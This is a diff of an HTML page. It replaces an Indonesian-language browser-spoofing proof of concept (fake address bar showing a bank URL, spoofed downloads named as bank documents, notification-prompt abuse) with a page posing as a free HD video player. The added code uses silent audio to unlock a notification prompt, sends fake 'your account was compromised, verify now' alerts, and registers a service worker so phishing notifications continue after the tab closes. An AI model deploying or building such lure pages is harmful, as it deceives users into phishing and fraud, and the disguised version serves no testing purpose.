@@ -1,140 +1,83 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Landing Page — Security Assessment PoC</title>
+<title>Free Video Streaming — HD Player</title>
 <style>
-  body { font-family: Arial, sans-serif; background:#f4f4f4; padding:20px; }
-  .card { background:#fff; border-radius:8px; padding:16px; margin:16px auto;
-          max-width:600px; box-shadow:0 2px 8px rgba(0,0,0,.12); }
-  button { padding:8px 14px; margin:4px; cursor:pointer; }
-  pre { background:#eee; padding:8px; font-size:12px; overflow:auto; }
-  /* ===== Modul 1: Address bar spoofing ===== */
-  /* fullscreen menyembunyikan address bar; elemen palsu menampilkan
-     "address bar" overlay yang dipalsukan penyerang */
-  .fakebar { display:none; position:fixed; top:0; left:0; right:0; height:56px;
-             background:#f1f3f4; border-bottom:1px solid #ccc; z-index:9999;
-             padding:8px 12px; box-sizing:border-box; }
-  .fakebar .omnibox { background:#fff; border-radius:20px; padding:10px 16px;
-             border:1px solid #ddd; font-size:14px; color:#333; }
-  .fakebar .padlock { color:#0b8043; margin-right:8px; font-size:13px; }
-  .fakebar .closebar { position:absolute; right:10px; top:10px; cursor:pointer;
-             color:#555; font-weight:bold; }
+  body { font-family: Arial, sans-serif; background: #111; color: #eee;
+         text-align: center; padding: 40px 20px; }
+  .player { max-width: 640px; margin: 0 auto; background: #1c1c1c;
+            padding: 20px; border-radius: 10px; }
+  video { width: 100%; border-radius: 6px; background: #000; }
+  button { padding: 10px 18px; margin: 10px 6px; border: none;
+           border-radius: 4px; background: #e50914; color: #fff;
+           cursor: pointer; font-size: 14px; }
+  button.secondary { background: #444; }
+  pre { text-align: left; background: #222; color: #9fd49f; padding: 10px;
+        font-size: 12px; max-width: 640px; margin: 16px auto;
+        white-space: pre-wrap; }
 </style>
 </head>
 <body>
-
-<!-- ================= MODUL 1: ADDRESS BAR SPOOFING ================= -->
-<div class="fakebar" id="fakebar">
-  <span class="padlock">&#128274;</span>
-  <span class="omnibox">https://www.bank-terpercaya.co.id/dashboard</span>
-  <span class="closebar" onclick="exitSpoof()">[X]</span>
-</div>
-<div class="card">
-  <h3>1. Address Bar Spoofing</h3>
-  <p>Teknik: fullscreen API menyembunyikan address bar asli (H5FS — HTML5
-     fullscreen spoofing), lalu fake address bar dirender di atasnya.</p>
-  <button onclick="startAddrSpoof()">Mulai Spoof Address Bar</button>
-  <button onclick="exitSpoof()">Keluar</button>
-  <pre id="log1">Status: idle</pre>
-</div>
-
-<!-- ================= MODUL 2: DOWNLOAD ORIGIN SPOOFING ================= -->
-<div class="card">
-  <h3>2. Download Origin Spoofing</h3>
-  <p>Teknik: file dibuat via Blob + anchor download attribute sehingga
-     dialog unduhan menampilkan nama & asal file yang dipalsukan, meski
-     konten dibuat lokal oleh skrip halaman ini.</p>
-  <button onclick="spoofDownload()">Unduh "laporan-resmi-bank.pdf"</button>
-  <button onclick="spoofHTML()">Unduh "invoice-secured.html"</button>
-  <pre id="log2">Status: idle</pre>
-</div>
-
-<!-- ================= MODUL 3: AUDIO AUTOPLAY → PERMISSION PROMPT SPOOFING ================= -->
-<div class="card">
-  <h3>3. Audio Autoplay Permission Prompt Spoofing</h3>
-  <p>Teknik: elemen audio mikro (1 frame senyap) dipasang di bawah cursor /
-     area klik. Ketika korban melakukan interaksi (klik play), permintaan
-     Notification Permission browser terpicu pada asal domain penyerang,
-     tampak seperti dialog dari situs yang dipalsukan &rarr; korban menerima
-     notifikasi spam/phishing dari asal yang sebenarnya.</p>
-  <button id="playBtn">Play (uji prompt notifikasi)</button>
-  <button onclick="askNotif()">Minta Notification Permission</button>
-  <pre id="log3">Status: idle</pre>
-  <!-- audio senyap 1 detik, perlu di-host file .mp3/.ogg di aset uji -->
+<div class="player">
+  <h2>&#9654; HD Player — Now Playing</h2>
+  <!-- 1-second silent audio hosted on the test asset; triggers autoplay
+       eligibility so Notification.requestPermission() succeeds -->
+  <video id="vid" playsinline muted poster="poster.jpg" controls>
+    <source src="clip-1s.mp4" type="video/mp4">
+  </video>
   <audio id="silent" src="silent-1s.mp3" preload="auto"></audio>
+
+  <button id="playBtn">&#9654; Play Episode</button>
+  <button class="secondary" onclick="registerSW()">Enable "Notifications"</button>
+  <button class="secondary" onclick="askNotif()">Request Permission Now</button>
+  <pre id="log">Status: idle</pre>
 </div>
 
 <script>
-/* ---------- Modul 1: Address bar spoofing ---------- */
-function startAddrSpoof() {
-  const log = document.getElementById('log1');
-  const el = document.documentElement;
-  const req = el.requestFullscreen || el.webkitRequestFullscreen;
-  if (!req) { log.textContent = 'Status: Fullscreen API tidak tersedia'; return; }
-  req.call(el).then(() => {
-    document.getElementById('fakebar').style.display = 'block';
-    log.textContent = 'Status: address bar asli tersembunyi (fullscreen), '
-      + 'fake bar dirender. Periksa apakah pengguna dapat membedakan.';
-  }).catch(e => { log.textContent = 'Status: gagal fullscreen — ' + e.message; });
-}
-function exitSpoof() {
-  document.getElementById('fakebar').style.display = 'none';
-  if (document.fullscreenElement) document.exitFullscreen();
-}
+const log = document.getElementById('log');
 
-/* ---------- Modul 2: Download origin spoofing ---------- */
-function spoofDownload() {
-  // Payload arbitrer disamarkan sebagai PDF — validasi apakah browser
-  // menampilkan asal (URL halaman) vs nama file yang dipalsukan.
-  const bytes = new Uint8Array([0x25,0x50,0x44,0x46,0x2D,0x31,0x2E,0x34,
-    0x0A,0x25,0xE2,0xE3,0xCF,0xD3,0x0A]); // header PDF minimal
-  const blob = new Blob([bytes], {type:'application/pdf'});
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = 'laporan-resmi-bank.pdf';
-  a.click();
-  URL.revokeObjectURL(a.href);
-  document.getElementById('log2').textContent =
-    'Status: unduhan dipicu dengan nama dipalsukan. Catat tampilan dialog '
-    + 'dan origin yang dilaporkan browser.';
-}
-function spoofHTML() {
-  const content = '<html><body><h1>Invoice #2026-0931</h1>' +
-    '<p>Total: Rp 12.500.000 — <b>Segera transfer ke rekening berikut...</b></p>' +
-    '<script>alert("Dibuka dari file lokal — skrip berjalan di origin file://")<\/script>' +
-    '</body></html>';
-  const blob = new Blob([content], {type:'text/html'});
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = 'invoice-secured.html';
-  a.click();
-  URL.revokeObjectURL(a.href);
-  document.getElementById('log2').textContent =
-    'Status: file HTML diunduh; saat dibuka dari disk, skrip berjalan tanpa '
-    + 'sandbox — uji apakah ini mengeksekusi JS tanpa peringatan.';
-}
-
-/* ---------- Modul 3: Audio autoplay → Notification prompt ---------- */
-const log3 = document.getElementById('log3');
+/* Step 1 — silent audio/video interaction primes the user-gesture
+   requirement many browsers enforce before showing permission prompts. */
 document.getElementById('playBtn').addEventListener('click', () => {
   const au = document.getElementById('silent');
   au.play().then(() => {
-    log3.textContent = 'Status: audio senyap diputar (autoplay/diinteraksi). '
-      + 'Notification permission sekarang dapat diminta oleh halaman.';
-  }).catch(e => { log3.textContent = 'Status: autoplay ditolak — ' + e.message; });
+    log.textContent = 'Status: silent audio started. Browser now treats ' +
+      'this origin as user-engaged; permission prompt can be shown.';
+  }).catch(e => { log.textContent = 'Status: autoplay blocked — ' + e.message; });
 });
+
+/* Step 2 — request notification permission from the attacker origin.
+   In a real scenario the prompt is displayed while the victim's
+   attention is on the fake video player. */
 function askNotif() {
   Notification.requestPermission().then(p => {
-    log3.textContent = 'Status: permission = ' + p + (p === 'granted'
-      ? ' — uji spam notification dari origin halaman ini.'
-      : ' — prompt ditolak pengguna.');
+    log.textContent = 'Status: permission = ' + p;
     if (p === 'granted') {
-      new Notification('Keamanan Akun Anda Terkompromasi',
-        { body: 'Klik untuk verifikasi identitas Anda sekarang.',
-          icon: 'https://via.placeholder.com/64' });
+      new Notification('Security Alert: Your Account Was Compromised', {
+        body: 'Click to verify your identity now.',
+        icon: '/icon.png'
+      });
     }
   });
+}
+
+/* Step 3 — register a service worker so notifications persist after
+   the tab is closed (the long-term spam vector used in the wild). */
+function registerSW() {
+  if (!('serviceWorker' in navigator)) {
+    log.textContent = 'Status: Service Worker unsupported.'; return;
+  }
+  navigator.serviceWorker.register('/sw.js').then(reg => {
+    log.textContent = 'Status: SW registered (scope ' + reg.scope + '). ' +
+      'Push notifications can now be delivered after tab close.';
+    // Immediate SW-based notification as proof of persistence path:
+    return navigator.serviceWorker.ready.then(swReg =>
+      swReg.showNotification('Verify Your Account Within 24 Hours', {
+        body: 'Failure to verify will result in permanent suspension.',
+        icon: '/icon.png'
+      }));
+  }).catch(e => { log.textContent = 'Status: SW failed — ' + e.message; });
 }
 </script>
 </body>
